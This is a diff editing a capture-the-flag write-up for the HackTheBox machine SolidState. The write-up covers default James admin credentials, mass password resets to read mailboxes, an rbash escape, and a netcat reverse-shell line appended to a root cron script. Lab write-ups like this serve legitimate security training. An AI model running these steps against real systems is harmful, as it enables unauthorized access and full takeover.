@@ -1,4 +1,4 @@
-[Main Page](../index.md) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) <br>
+[Main Page](../index.md) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.md) \| [How-To Guides](../How-To-Guides/HowTo-index.md) <br>
 
 
 # CTF Writeup:
@@ -14,10 +14,9 @@
 
 
 
-As a whole, SolidState is a beginner’s CTF.<br>
-However, if you are able to solve it, you are well on your way to the more intermediate level CTFs.<br>
-You can’t just run an exploit, get root and reuse passwords all the way to glory.<br>
-This box requires actual enumeration, exploit research and investigation, and prior knowledge.<br>
+From a bird's eye view, SolidState is a beginner’s CTF.<br>
+
+However, if you are able to solve it, you are well on your way to the more intermediate level CTFs. This box requires actual enumeration, exploit research and investigation, and prior knowledge. It is a great test of your ability to understand what exactly you should looking for while enumerating. It’s a fun one.
 
 
 There is a key concept that you will have to know about ahead of time.<br>
@@ -25,21 +24,18 @@ The box does not offer much in the way of a hint in it’s direction. <br>
 
 
 I was able to solve it by browsing through Ben Clark’s *Red Team Field Manual* and researching enumeration and privilege escalation guides online.<br>
-Shoutout to [g0tm1lk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) and [mubix]( https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List) for showing the way.
 
-It is a great test of your ability to understand what exactly you might be looking for while enumerating. It’s a fun one.
+Shoutout to [g0tm1lk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) and [mubix]( https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List) for excellent PrivEsc and Enumeration guides.
 
 
 This write up assumes that the reader is using Kali, but any pentesting distro such as [BlackArch](https://blackarch.org/) will work.
 The tools come with a stock Kali installation, unless otherwise mentioned.
 
-<br>
+
 
 ## 1. Initial Scans
 
-
-Before anything, I added the IP to my `/etc/hosts` for convenience as `solidstate.htb` <br>
-
+Before anything else, I added the IP to my `/etc/hosts` for convenience as `solidstate.htb` <br>
 
 
 I began with my [benmap.sh]( https://github.com/berzerk0/textfiles/blob/master/Shell_Scripts/benmap.sh) script, which runs nmap in stages.
@@ -61,7 +57,7 @@ Our scan finds the box is running
 * NNTP at port 119
 
 
-Ports 25, 110 and 119 all seemed to contain software named James, which was very interesting. However, I usually like to start with HTTP scans. I set those in motion before investigating James.
+Ports 25, 110 and 119 all seemed to contain software named __James__, a solid place to begin investigating. However, I like to start with HTTP scans. I set those in motion before investigating James.
 
 `nikto` and `dirsearch` are must-runs when investigating HTTP.
 
@@ -98,8 +94,8 @@ Maybe [findsploit]( https://github.com/1N3/Findsploit) has something interesting
 <br>
 
 
-That RCE exploit matches our version of James.
-Let’s just run it and see if we get RCE.
+That RCE script matches our James version.
+Why not just run it and see if we get RCE?
 
 
 <br>
@@ -109,17 +105,17 @@ Let’s just run it and see if we get RCE.
 
 *"Payload will be executed when someone logs in."*
 
-Who is going to log in? Some other HackTheBox user?<br>
-I’d rather not wait for that.
+Who is going to log in, though?<br>
+Another HackTheBox user? I’d rather not wait for that.
 
 
 RCE usually entails some sort of powerful access. <br>
-There has to be something we can dig out of it.
+There has to be something we can dig out of the module itself.
 
 
 ## 2. Enumerating James
 
-If we can look into the exploit code, we might be able to determine what gives the exploit its effectiveness and redirect it in some way.
+If we look into the exploit code, we might be able to determine what gives the exploit its effectiveness and redirect it in some way.
 
 
 
@@ -129,19 +125,18 @@ If we can look into the exploit code, we might be able to determine what gives t
 
 
 The exploit script contains credentials!<br>
-Both username and password are `root`<br>
-Seems like we are dealing with top notch security here.<br>
+Both username and password are `root` - real top-notch security. <br>
 
 Just for the hell of it, I tried `ssh root@solidstate.htb` with the password `root`<br>
-This didn’t work. unsurprisingly.
+This didn’t work, unsurprisingly.
 
 
-The exploit is attempting to connect to port 4555, maybe I can do that myself using `nc` ?
+The exploit is attempting to connect to port *4555*. Maybe we can do that ourselves using `nc` ?
 
 
 * `nc solidstate.htb 4555` <br>
 
-Then login using the `root` as both username and password.
+Use `root` as both username and password when asked.
 
 <br>
 ![A7]( https://i.imgur.com/Ud58gyW.png)
@@ -149,8 +144,8 @@ Then login using the `root` as both username and password.
 
 
 `help` tells us about the ability to create a new user. <br>
-Perhaps our new user will have access to the system in some way?<br>
-Let’s see what will happen.
+Will our new user have access to the system in some way?<br>
+Let’s see what happens.
 
 
 
@@ -162,27 +157,27 @@ Let’s see what will happen.
 <br>
 
 
-Frank is here to cause trouble, but what can he *do*?
-Let’s look at the ports for guidance.
+Frank is here to cause trouble, but what can he *do*? <br>
+Our `nmap` scan provides some guidance.
 
 
-SMTP is used to *send* emails. <br>
-POP3 is used to *read* emails. <br>
-NNTP is for Usenet, which I know nothing about. If I run out of ideas, I will come back to it.
+* SMTP is used to *send* emails. <br>
+* POP3 is used to *read* emails. <br>
+* NNTP is for Usenet, which I know nothing about. If we run out of ideas, we'll come back to this.
 
 
-It’s pretty unlikely someone is going to be sending Frank any new emails – unless James has some sort of automated features in place. <br>
-Will Frank get an email containing a randomly generated SSH password?
+It’s pretty unlikely someone is going to be sending Frank any new emails. However, it is possible that James has some automated features in place to get our "new user" up to speed. <br>
+
+Will Frank get an email containing a randomly generated SSH password? We better check his inbox at the POP3 port.
 
 
 
-* `nc telnet solidstate.htb 110` didn't wor.
+* `nc telnet solidstate.htb 110` didn't work.
 
-How can we connect to this port?
+How can we connect to this port? I searched online for an answer.
 
 
-Eventually, I found found that POP3 can be communicated with over `telnet`<br>
-I had never used POP3 commands before, but a quick online search showed it wasn't tough to operate.<br>
+Eventually, I found that POP3 can be communicated with over `telnet`. I had never used POP3 commands before, but a quick online search showed it wasn't tough to operate.<br>
 
 
 * `telnet solidstate.htb 110`
@@ -200,7 +195,6 @@ The interface on port 4555 also allowed me to change the passwords for the other
 Maybe one of them has something interesting in their inbox?
 
 
-
 * `nc solidstate.htb 4555`
 * `listusers`
 
@@ -216,12 +210,15 @@ Using the `setpassword` command, we can set all passwords to `beans`.
 ![A10]( https://i.imgur.com/ki4NPdL.png)
 <br>
 
+It wasn't very likely, but we should see if `beans` gets us SSH access to any of the accounts.
 
-Then, we can use the same email-checking process we used for Frank, but for all the users.
+It didnt.
 
-We start with `mailadmin` and `james` - but quickly find that neither had any mail.<br>
-So, we move on to the other users, going down the list and checking inboxes.<br>
-No luck - except...
+Oh well, now we can use the same email-checking process we used for Frank, but for all the users.
+
+We start with `mailadmin` and `james` - but quickly find that neither had any mail.
+
+So, we move on to the other users, going down the list and checking inboxes. All but one turns up empty.
 
 
 <br>
@@ -257,10 +254,10 @@ pass: P@55W0rd1!2@
 
 
 How nice of them to communicate these in the CLEAR via email.<br>
-Passwords in plaintext emails is not a great idea.<br>
-Maybe after we exploit her credentials, Mindy can bring change to this organization.<br>
 
-Let's go ahead and put on our Mindy hats.
+Passwords in plaintext emails is not a great idea.
+After we exploit her credentials, maybe Mindy can get this organization to abandon this practice.
+
 
 * `ssh mindy@solidstate.htb`
 
@@ -274,6 +271,7 @@ As soon as we log in, we see that something is fishy here.
 
 <br>
 ![A14](https://i.imgur.com/hXiOCNe.png)
+<br>
 ![A15]( https://i.imgur.com/MCM7MQz.png)
 <br>
 
@@ -286,8 +284,7 @@ Look at all this mess in the terminal, let's `clear` it away.
 <br>
 
 
-No clear?<br>
-Uh... this can't be good.
+No `clear`? That can't be good. <br>
 I hope I can grab the user flag, at least.
 
 <br>
@@ -298,54 +295,53 @@ User flag captured!
 
 
 
-The fact that I can't use `clear` or most other commands is intolerable.<br>
-I didn't know what was causing such a limited shell, so I tried my standard tty gaining command.
+The fact that we can't use `clear` or most other commands is intolerable.<br>
+
+I didn't know what was causing such a limited shell, so I tried the a command to gain a tty.
 
 * `python -c 'import pty; pty.spawn("/bin/bash")`
 
 
-But this didn't help. Hmm. <br>
-What else do I know?
+Unfortunately, this didn't do the trick. <br>
 
+What other information do we have?
 
-When I tried `clear`, the error message included the term `rbash`. <br>
-What does this mean?<br>
+Well, when I tried `clear`, the error message included the term `rbash`. <br>
+
+What does `rbash` mean?<br>
 
 I did a quick search online which lead me to [this SANS article.](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)<br>
 It was my understanding that as soon as we logged in with `ssh`, the system locked us into the restricted shell.<br>
 
-Some time before doing this box, I had done [Bandit at overthewire.org.](http://overthewire.org/wargames/bandit/) <br>
-One of the levels involved using `ssh` to run a command that would be executed right as a user logged in.<br>
-This would be run faster than an automatic *kick user* command, allowing the user to maintain access.
+ Before doing this box, I had done [Bandit at overthewire.org.](http://overthewire.org/wargames/bandit/) <br>
+One of the levels was solved by running `ssh` with another command *"attached."*
+This attached command would run faster than an automatic *kick user* command, allowing the user to maintain access.
+
+Perhaps that method could be deployed here?
 
 
-Perhaps this method could be deployed here as well?
+I tried to combine the idea of running a command in tandem with the `ssh` command with the ideas in the SANS paper. This is what I came up with:
 
-
-We can combine the idea of running a command in tandem with the `ssh` command with the ideas in the SANS paper.
-When I tried this, I  came up with:
 
 * `ssh mindy@solidstate.htb vi`
 
-Then, from within the `vi` text editor, running `:!bash`
+Then, from within the `vi` text editor, running `:!bash`.
 
 
 This line runs `vi` before the system can apply `rbash`. <br>
-Then, we can take advantage of the fact that `vi` can run shell commands from within the text editor to start a`bash` shell.
+Then, we can take advantage of `vi`'s ability to run shell commands from within the text editor to start a `bash` shell.
 
-<br>
 
-While this method did work, I ultimately found out there was a faster method.
+While this *did* work, I ultimately found a more elegant method.
 
 
 * `ssh mindy@solidstate.htb bash`
 
 
-`bash` is simply run as a command, skipping the `vi` step.<br>
-This shell still doesn't have a tty, so we run the ol' python command.
+`bash` itself is run as a command, skipping the `vi` step.<br>
+This shell still doesn't have a tty, but that isn't anything our Python command can't fix.
 
-
-`python -c 'import pty;pty.spawn("/bin/bash")'`
+* `python -c 'import pty;pty.spawn("/bin/bash")'`
 
 <br>
 ![A18](https://i.imgur.com/E8ZmR6S.png)
@@ -359,35 +355,40 @@ This shell still doesn't have a tty, so we run the ol' python command.
 Armed with a decent shell, it's time to get some information about the system.
 
 
-`cat /etc/*release*` tells us we are dealing with Debian - this is good news. <br>
-Ubuntu CTFs don't like the simplest `nc` reverse shell, but Debian machines do!
+`cat /etc/*release*` tells us we are dealing with Debian.
+Ubuntu CTFs don't like the simplest `nc` reverse shell, but vanilla Debian machines do!
 I haven't memorized any of the reverse shell commands yet, but `nc local.machine.ip.addr PORT -e /bin/bash` isn't hard to remember.
 
 
 
 `sudo -l` is worth a shot, since we have Mindy's password.<br>
-Unfortunately, we find out that Mindy doesn't have access to `sudo.` <br>
-This might mean we have to exploit or revshell our way to root.
+
+Unfortunately, we find out that Mindy doesn't have access to `sudo.`This might mean we have to exploit or RevShell our way to root.
 
 
-Before diving deeply into enumeration, I decided to do a quick check of some directories.
-Finding nothing in any `/home` folders, I decided to check `/opt` for third party software.
+To start enumeration, we do a quick `ls` in some commonly used directories like `/home` and `/opt.`
+
+`/home` came up empty at first glance, but `/opt` held promise.
 We know the system is running `james` - so maybe there are some useful configuration files.
+
+* `ls /opt`
+* `ls -la /opt`
 
 <br>
 ![A19](https://i.imgur.com/BywMsv6.png)
 <br>
 
 
-One of these files is noteworthy - `tmp.py`.<br>
-It is owned by `root`, but we have write permissions.<br>
-Interesting - Let's have a look. <br>
+One of these files is noteworthy: `tmp.py`.<br>
+It is owned by `root`, but we have write permissions. I smell a PrivEsc!
+
+* `cd /opt`
+* `cat tmp.py`
 
 <br>
 ![A20](https://i.imgur.com/hsREnfc.png)
 <br>
 
-<br>
 
 This script seems to just erase the contents of the `/tmp` folder.<br>
 Is the `root` user expecting me to put something in there? <br>
@@ -403,16 +404,16 @@ Does `root` run it with a cronjob?
 
 <br>
 
-### Rambling Side Note
+### Rambling, Skippable Side Note
 It wasn't until I had already been attempting this box for some time did I learn about the existence of cronjobs.<br>
 I had to come across the concept in my other attempts to familiarize myself with Linux. <br>
-This underscores a ned to understand the fundamentals of the OS.<br>
+This underscores a need to understand the fundamentals of the OS.<br>
 If you don't understand the OS, it is a lot more difficult to exploit it.
 
 
 The idea for cronjobs being important here is hinted at by the name.<br>
 Solid-State implies no moving parts.<br>
-Thematically, this concept is the opposite of this box which runs a script "unexpectedly."<br>
+Thematically, this concept is the opposite of this box, which runs a script without any user input.<br>
 
 
 My academic background included classes on circuit design, and the term *Solid State* got conflated with the concept of *steady-state*.<br>
@@ -431,12 +432,11 @@ Mixing up Solid-State and Steady-State - I ended up stumbling upon the key conce
 
 ## 5. Waiting For the Root to Sprout
 
-If the script is run as a cronjob, then we just need to add a line that starts a reverse shell.<br>
+If the script is run as a cronjob, then we just need to add a line that starts a reverse shell.
 Since the script would be executed as root, the created shell would have root privileges.
 
 
-We want to catch this shell as soon as the command is sent - so we don't miss it.<br>
-Let's set up our listener before altering the script.
+We want to catch this shell as soon as the command is sent, so let's set up our listener before altering the script.
 
 
 On our local machine, we run:
@@ -450,10 +450,11 @@ But, before we do this, let's make a copy of the original `tmp.py` - in case we 
 * `cp /opt/tmp.py /dev/shm/copy.py`
 <br>
 
-(I did *not* do this while editing, made a typo and ended up having to reset the box.) <br>
+I did *not* do this while editing, made a typo and ended up having to reset the box. <br>
+
 We can't write it to `/tmp`, since that gets cleaned out with our script. <br>
 We can't write it to `/opt`, since we don't have permission. <br>
-`/dev/shm` is a good location. We have write access, and it is cleared after a machine reboots.
+`/dev/shm` is a good location. We have write access, and it is cleared upon reboot.
 
 The original, unedited script contains a nice example on how to run `bash` commands from within python. <br>
 
@@ -466,9 +467,7 @@ import sys
 os.system('BASH COMMANDS')
 ````
 
-<br>
-
-We just need to use the same method that is already demonstrated in `tmp.py` <br>
+We can use this method with our own, shell-spawning bash commands.
 Append the command for the simple `nc` revshell onto `tmp.py` using `echo` and `>>`
 
 
@@ -521,4 +520,4 @@ Time to crack open some books.
 *Thanks to HackTheBox and ch33zplz for this CTF!*
 
 <br>
-[Main Page](../index.md) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) <br>
+[Main Page](../index.md) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.md) \| [How-To Guides](../How-To-Guides/HowTo-index.md) <br>
